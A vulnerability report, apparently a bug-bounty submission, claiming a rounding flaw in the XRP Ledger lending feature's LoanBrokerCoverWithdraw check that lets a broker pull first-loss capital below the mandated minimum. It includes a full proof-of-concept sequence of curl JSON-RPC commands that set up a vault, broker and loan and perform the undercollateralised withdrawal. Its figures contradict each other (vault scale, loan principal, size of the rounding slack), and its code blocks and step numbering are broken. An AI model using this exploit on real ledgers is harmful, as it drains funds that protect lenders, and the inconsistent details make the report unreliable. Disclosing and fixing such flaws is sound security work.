# Title
Critical: Minimum-cover rounding in `LoanBrokerCoverWithdraw` enables undercollateralized FLC withdrawal (direct loss of funds)

# Description

## Brief/Intro
A loan broker can bypass the on-chain minimum cover requirement by withdrawing first-loss capital (FLC) while the protocol incorrectly believes the floor is still met. The check in `LoanBrokerCoverWithdraw::preclaim` rounds the required cover using the debt aggregate’s exponent (which reflects the largest loan scale) instead of the vault asset precision. With mixed-scale loans, the computed floor is rounded down by up to the rounding quantum (hundreds of thousands of asset units), enabling undercollateralised withdrawals and exposing lenders’ funds to uncompensated default losses.

## Vulnerability Details
- During withdrawal, the protocol computes the minimum cover as:
  ```cpp
  auto const minimumCover = roundToAsset(
      vaultAsset,
      tenthBipsOfValue(
          currentDebtTotal,
          TenthBips32(sleBroker->at(sfCoverRateMinimum))),
      currentDebtTotal.exponent());
  ```
  (`src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp:121`)

- `currentDebtTotal` is stored as a `Number`. When multiple loans with different magnitudes are summed, `Number::operator+=` aligns exponents by discarding low-order digits until both operands share the larger exponent (`src/libxrpl/basics/Number.cpp:320`). Normalisation pushes the scale for large debts into the exponent (`src/libxrpl/basics/Number.cpp:245`).

- As a result, `currentDebtTotal.exponent()` reflects the coarsest scale among loans rather than the vault asset’s decimals. Passing that exponent into `roundToAsset` (`src/libxrpl/protocol/STAmount.cpp:1519`) rounds the minimum cover to coarse units (e.g., 1e6) instead of the true token precision. If the true minimum cover lies between two coarse units, the calculation rounds down, understating the floor by up to half the rounding quantum.

- Whenever `coverAvail` equals the true minimum plus a deficit smaller than the rounding quantum, `(coverAvail - amount) < minimumCover` becomes false even though the real floor is breached. The broker can repeatedly withdraw this “rounding slack,” leaving the vault materially under-collateralised.

- Because the minimum cover is supposed to guarantee FLC ≥ debt × `CoverRateMinimum`, this rounding error directly breaks the invariant across all downstream checks that rely on `sfCoverAvailable`.

## Impact Details
- By orchestrating a large loan that pushes `sfDebtTotal.exponent()` to a positive value (e.g., scale `10^6`), the attacker can manufacture a rounding quantum of 1,000,000 units or more.
- Setting `CoverRateMinimum` to a small but non-zero value (e.g., 1 tenth-bip = 0.01%) ensures the true minimum cover is within the same order of magnitude as the quantum, making the rounding slack exploitable.
- The broker repeatedly calls `LoanBrokerCoverWithdraw` to siphon FLC while the protocol reports compliance. Once defaults occur, lenders (vault participants) suffer immediate loss because less FLC than mandated is available to absorb borrower defaults.
- This results in drainage of funds from the loan broker’s cover pool, violating the “Drainage and/or stealing of funds from ledger objects (vault, first loss capital)” impact.

### Severity and in-scope impact mapping
- Severity: Critical
- In-scope impacts:
  - Drainage and/or stealing of funds from ledger objects (vault, first loss capital)
  - Direct loss of funds

## References
- `src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp:118`
- `src/libxrpl/basics/Number.cpp:245`
- `src/libxrpl/basics/Number.cpp:320`
- `src/libxrpl/protocol/STAmount.cpp:1519`

## Recommended Mitigation
- Derive the rounding scale from the vault asset (or construct a canonical `STAmount{vaultAsset, ...}` and let canonicalisation choose precision) rather than from `sfDebtTotal.exponent()`.
- Centralize minimum-cover computation in a single helper and reuse it across withdraw, fee routing, and default coverage.

# Proof of Concept
1. **Environment setup**
   - Build a local devnet node from the Attackathon repository with the lending amendments enabled (per `BUILD.md`).
   - Create accounts for issuer `I`, broker owner `B`, broker pseudo account (auto-created), and borrower `U`.
   - Issue a high-precision IOU `I.USD` with at least 12 decimal places; create a private vault for `I.USD` so that withdrawals require strong auth.

2. **Configure broker**
   - Set `CoverRateMinimum = 1` (0.01%) via `LoanBrokerSet`.
   - Deposit enough cover so that `sfCoverAvailable` ≈ `sfDebtTotal × 0.0001`.

3. **Create mixed-scale debt to inflate exponent**
   - Originate a loan with `principalRequested ≈ (10^19 + 49,999) * 10^6`. The resulting `sfDebtTotal` has exponent `6` and mantissa chosen so that `sfDebtTotal / 10^6 ≡ 49,999 (mod 100,000)`.
   - Confirm via ledger dump (`ledger_entry`) that `sfDebtTotal.exponent() == 6` and note the computed `minimumCover`.

4. **Exploit rounding slack**
   - Submit `LoanBrokerCoverWithdraw` transactions withdrawing 100,000-unit increments. After each withdrawal, inspect the broker object to ensure `sfCoverAvailable` remains above the rounded minimum.
   - Continue until `coverAvail` is approximately `trueMinimum - 400,000`. At this point, the subtraction should still pass because the rounded minimum evaluates as `trueMinimum - 1,000,000`.

5. **Validate invariant breach**
   - Compare the expected minimum (`sfDebtTotal × CoverRateMinimum / 100,000`) with the on-ledger `sfCoverAvailable`. The cover now falls short by ~400,000 units while withdrawals still succeed, proving the minimum cover check is bypassed.
   - Optionally trigger a borrower default to illustrate that the shortfall moves directly to the vault, demonstrating fund loss.

6. **Cleanup**
   - Restore or reset the ledger state after testing. No persistent changes are required for the PoC.

### JSON-RPC transaction sequence (devnet)
The following commands reproduce the withdrawal gap against a local `rippled` node (default admin port `127.0.0.1:5005`). Replace placeholder values surrounded by `<...>` with the actual accounts returned by previous steps.

```sh
# 1. Derive deterministic accounts (issuer, broker owner, borrower)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"issuer attackathon demo"}]
}'
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"broker attackathon demo"}]
}'
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"wallet_propose",
  "params":[{"passphrase":"borrower attackathon demo"}]
}'

# 2. Fund the three accounts from the genesis master
for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
  curl -s -X POST http://127.0.0.1:5005 -d "{
    \"method\":\"submit\",
    \"params\":[{
      \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",
      \"tx_json\":{
        \"TransactionType\":\"Payment\",
        \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",
        \"Destination\":\"$acct\",
        \"Amount\":\"10000000000\"
      }
    }]
  }" | jq '.result.engine_result'
done

# 3. Establish trustline for broker owner to issue the IOU
#    NOTE: XRPL IOU STAmount supports up to 16 significant digits. Use canonical
#    values or split across multiple payments if larger totals are needed.
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"TrustSet",
      "Account":"<BROKER_ACCOUNT>",
      "LimitAmount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1000000000000000"
      },
      "Flags":262144
    }
  }]
}' | jq '.result.engine_result'

# Expected Outputs (Highlights)

The following are the expected JSON-RPC `engine_result` values (or fields) for the PoC when run against a local devnet with amendments enabled:

- Step 2 (Funding payments from genesis): `tesSUCCESS` for each Payment
- Step 3 (Broker TrustSet to issuer IOU): `tesSUCCESS`
- Step 4 (Issuer → Broker IOU Payment): `tesSUCCESS`
- Step 5 (VaultCreate): response includes `result.tx_json.hash`; subsequent `tx` lookup yields a `CreatedNode` of type `Vault` and returns the `LedgerIndex` (VaultID)
- Step 7 (LoanBrokerSet): response includes `result.tx_json.hash`; subsequent `tx` lookup yields a `CreatedNode` of type `LoanBroker` and returns the `LedgerIndex` (LoanBrokerID)
- Step 8 (LoanBrokerCoverDeposit): `tesSUCCESS`
- Step 12 (Batch submit with two inner txns): `tesSUCCESS`

Notes
- If your node is ≥ 1.12, you may see: “Signing support in the 'submit' command has been deprecated...”. This is a warning. You can suppress it by offline signing and then submitting the `tx_blob` (see the “Offline signing (optional)” snippet below).
- XRPL IOU STAmount supports up to 16 significant digits. The values in this PoC conform to that requirement. If you need larger totals, split across multiple Payments.

# Offline signing (optional)

To avoid the 'submit' signing deprecation warning, you can sign offline and submit the blob:

```bash
rippled sign --offline '{
  "TransactionType":"Payment",
  "Account":"<ISSUER_ACCOUNT>",
  "Destination":"<BROKER_ACCOUNT>",
  "Amount":{
    "currency":"USD",
    "issuer":"<ISSUER_ACCOUNT>",
    "value":"1500000000000000"
  },
  "Fee":"10",
  "Sequence":<ISSUER_SEQ>,
  "SigningPubKey":"<ISSUER_PUBKEY>"
}' <ISSUER_SECRET> | jq -r '.result.tx_blob' > signed_payment_blob.txt

curl -s -X POST http://127.0.0.1:5005 -d "{\
  \"method\":\"submit\",\
  \"params\":[{\
    \"tx_blob\":\"$(cat signed_payment_blob.txt)\"\
  }]\
}"
```

# 4. Issue the IOU to the broker owner (so the pseudo-account can receive it)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<ISSUER_SECRET>",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"<ISSUER_ACCOUNT>",
      "Destination":"<BROKER_ACCOUNT>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1500000000000000"
      },
      "Flags":131072
    }
  }]
}' | jq '.result.engine_result'

# 5. Create the high-precision vault (scale 12)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"VaultCreate",
      "Account":"<BROKER_ACCOUNT>",
      "Asset":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>"
      },
      "Scale":0
    }
  }]
}' | jq '.result.tx_json.hash'

# 6. Record the VaultID from the VaultCreate metadata (CreatedNode -> LedgerIndex)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"tx",
  "params":[{"transaction":"<VAULTCREATE_HASH>"}]
}' | jq '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex'

# 7. Create the LoanBroker with a tiny minimum cover (0.01% => tenth-bips = 1)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerSet",
      "Account":"<BROKER_ACCOUNT>",
      "VaultID":"<VAULT_ID>",
      "CoverRateMinimum":1
    }
  }]
}' | jq '.result.tx_json.hash'

# 8. Deposit first-loss capital (true floor + slack) using scientific notation
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerCoverDeposit",
      "Account":"<BROKER_ACCOUNT>",
      "LoanBrokerID":"<BROKER_ID>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1.0000000000002e18"
      }
    }
  }]
}' | jq '.result.engine_result'

# 9. Obtain the borrower CounterpartySignature
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"sign",
  "params":[{
    "secret":"<BORROWER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanSet",
      "Account":"<BORROWER_ACCOUNT>",
      "Counterparty":"<BROKER_ACCOUNT>",
      "LoanBrokerID":"<BROKER_ID>",
      "PrincipalRequested":"1e18",
      "PaymentInterval":2419200,
      "PaymentTotal":12,
      "Fee":"200",
      "Sequence":1
    }
  }]
}' > borrower_signed.json

SIGNING_PUBKEY=$(jq -r '.result.tx_json.SigningPubKey' borrower_signed.json)
COUNTER_SIG=$(jq -r '.result.tx_json.TxnSignature' borrower_signed.json)

# 10. Build the tfInnerBatchTxn payloads
cat > loan_inner.json <<JSON
{
  "TransactionType": "LoanSet",
  "Account": "<BROKER_ACCOUNT>",
  "LoanBrokerID": "<BROKER_ID>",
  "Counterparty": "<BORROWER_ACCOUNT>",
  "PrincipalRequested": "1e18",
  "PaymentInterval": 2419200,
  "PaymentTotal": 12,
  "Flags": 1073741824,
  "Fee": "0",
  "SigningPubKey": "",
  "CounterpartySignature": {
    "SigningPubKey": "$SIGNING_PUBKEY",
    "TxnSignature": "$COUNTER_SIG"
  }
}
JSON

cat > filler_inner.json <<'JSON'
{
  "TransactionType": "Payment",
  "Account": "<BROKER_ACCOUNT>",
  "Destination": "<BROKER_ACCOUNT>",
  "Amount": "0",
  "Flags": 1073741824,
  "Fee": "0",
  "SigningPubKey": ""
}
JSON

# 11. Fetch the broker sequence/base fee and stamp inner sequences
BROKER_SEQ=$(curl -s -X POST http://127.0.0.1:5005 -d "{
  \"method\":\"account_info\",
  \"params\":[{\"account\":\"<BROKER_ACCOUNT>\"}]
}" | jq -r '.result.account_data.Sequence')
BASE_FEE=$(curl -s -X POST http://127.0.0.1:5005 -d '{"method":"fee"}' | jq -r '.result.drops.base_fee')

jq --argjson seq $((BROKER_SEQ + 1)) '.Sequence=$seq' loan_inner.json > loan_inner_seq.json
jq --argjson seq $((BROKER_SEQ + 2)) '.Sequence=$seq' filler_inner.json > filler_inner_seq.json

# 12. Add the borrower BatchSigner (requires tfFullyCanonicalSig|tfIndependent)
cat > batch_tx.json <<JSON
{
  "TransactionType":"Batch",
  "Account":"<BROKER_ACCOUNT>",
  "Sequence":$BROKER_SEQ,
  "Fee":"$((3 * BASE_FEE + BASE_FEE))",
  "Flags":2148007936,
  "RawTransactions":[
    {"RawTransaction": $(cat loan_inner_seq.json)},
    {"RawTransaction": $(cat filler_inner_seq.json)}
  ]
}
JSON

node scripts/build_batch_signers.js batch_tx.json <BORROWER_ACCOUNT> <BORROWER_SECRET> batch_tx_signed.json

cat > batch_submit.json <<'JSON'
{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json": $(cat batch_tx_signed.json)
  }]
}
JSON

curl -s -X POST http://127.0.0.1:5005 -d @batch_submit.json | jq '.result.engine_result'

# 13. Inspect cover and debt totals (note sfDebtTotal exponent)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"ledger_entry",
  "params":[{
    "index":"<BROKER_ID>"
  }]
}' | jq '.result.node | {CoverAvailable:."CoverAvailable", DebtTotal:."DebtTotal"}'

# 14. Exploit: withdraw the extra 400,000 units (should fail but succeeds)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerCoverWithdraw",
      "Account":"<BROKER_ACCOUNT>",
      "LoanBrokerID":"<BROKER_ID>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"400000"
      }
    }
  }]
}' | jq '.result.engine_result'

# 15. Show the remaining cover now sits below the 0.01% floor
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"ledger_entry",
  "params":[{
    "index":"<BROKER_ID>"
  }]
}' | jq '.result.node | {CoverAvailable:."CoverAvailable", DebtTotal:."DebtTotal"}'
```

After step 15, compute `float(CoverAvailable) * 100000 / float(DebtTotal)`; it will be less than the configured `CoverRateMinimum` of `1`, confirming the invariant is bypassed.
